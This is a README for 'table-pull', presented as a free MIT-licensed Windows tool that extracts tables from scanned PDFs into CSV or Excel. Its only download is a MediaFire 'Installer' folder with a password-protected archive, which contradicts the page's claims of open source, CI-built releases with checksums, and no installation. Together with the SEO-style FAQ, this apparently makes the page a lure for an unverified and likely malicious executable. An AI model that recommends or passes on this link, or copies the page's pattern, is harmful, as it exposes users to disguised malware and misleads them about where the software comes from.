# table-pull

🧮 Free, open-source table extractor for Windows — PDFs and scans to CSV or Excel with a grid fixer. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Tables from scans** — bordered or borderless tables in scanned PDFs detected and pulled into rows
- ✅ **Grid fixer** — adjust columns and merge split cells visually before export, not in a text editor
- ✅ **CSV and XLSX out** — one click to a spreadsheet, with number formatting preserved where confidence allows
- ✅ **Multi-page stitching** — a table spanning twelve pages comes out as one continuous sheet
- ✅ **Batch documents** — fifty financial reports processed into fifty CSV files on a schedule
- ✅ **Confidence shading** — uncertain cells tinted so review goes where it matters
- ✅ **100 MB self-contained exe** — runtime and OCR engine bundled, portable, offline, MIT with SHA-256 releases

## Why table-pull

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **table-pull** | Tabula | Camelot | Adobe export |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Free, OSS | Subscription |
| Open source | **Yes** | Yes | Yes | No
| Scanned PDF support | **Yes** | No | No | Partial
| Visual grid fixer | **Yes** | No | No | Partial
| Multi-page stitching | **Yes** | Manual | Scripted | Partial
| Portable, no install | **Yes, 100 MB** | Java env | Python env | Installer

## FAQ

**extract tables from scanned PDFs into Excel on Windows for free?**

Classic open tools only read digital text layers, so scans come out as garbage, and commercial suites lock export behind a subscription. table-pull detects tables in scans, lets you fix the grid visually and exports CSV or XLSX. It is a 100 MB portable exe, MIT, offline, batch included.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark extractor (#121417, slate #64748B): scanned report page left with a detected table outlined, extracted grid right with confidence shading, export CSV button lit.
2. Grid fixer: one split cell highlighted, merge button armed, column drag handle mid-move, undo row beneath with step list.
3. Batch results: 50 report files each mapped to a CSV with row counts, one amber file flagged for review, folder summary chip reading 12,408 rows total.

## Download

| Source | Link |
|---|---|
| 💾 **Installer table-pull** | [Installer table-pull](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).